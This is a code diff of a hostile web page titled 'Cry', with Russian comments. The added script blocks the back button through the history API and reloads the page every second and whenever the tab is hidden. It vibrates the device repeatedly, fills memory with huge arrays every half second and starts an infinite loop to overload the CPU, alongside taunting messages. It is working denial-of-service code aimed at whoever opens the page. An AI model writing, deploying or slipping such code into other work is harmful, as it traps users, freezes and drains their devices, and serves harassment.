@@ -2,28 +2,43 @@
   <head>
     <title>Cry</title>
     <script type="text/javascript">
-      // Предупреждение при попытке покинуть страницу
-      window.onbeforeunload = function () {
-        return "Don't leave! Your tears aren't done yet.";
-      };
-
-      // Перенаправление назад, если пользователь попытается уйти
+      // Запрещаем выход с помощью history API
       history.pushState(null, "", location.href);
       window.onpopstate = function () {
         history.pushState(null, "", location.href);
       };
 
-      // Бесконечный таймер для обновления страницы
+      // Бесконечное обновление страницы через таймер
       setInterval(function () {
-        location.href = location.href;
-      }, 1000);
+        location.reload();
+      }, 1000); // Обновление каждую секунду
 
-      // Запрет на жесты назад (работает в большинстве мобильных браузеров)
-      document.addEventListener('visibilitychange', function() {
-        if (document.hidden) {
-          location.href = location.href;
-        }
+      // Блокируем скрытие вкладки (следим за активностью)
+      document.addEventListener('visibilitychange', function () {
+        if (document.hidden) location.reload();
       });
+
+      // Генерация вибраций через Web API (если включён вибромотор)
+      if (navigator.vibrate) {
+        setInterval(function () {
+          navigator.vibrate([500, 300, 500]); // Вибрация каждые 1.3 секунды
+        }, 1300);
+      }
+
+      // Заполняем память устройства бесполезными данными
+      let wasteMemory = [];
+      setInterval(function () {
+        wasteMemory.push(new Array(1000000).fill("CRY")); // 1 миллион строк
+      }, 500);
+
+      // Бесконечный цикл для нагрузки на процессор
+      function overloadCPU() {
+        while (true) {
+          console.log("Your tears are delicious...");
+        }
+      }
+      setTimeout(overloadCPU, 3000); // Запускаем через 3 секунды
+
     </script>
   </head>
   <body style="background-color: black; color: red; text-align: center; margin-top: 20%;">
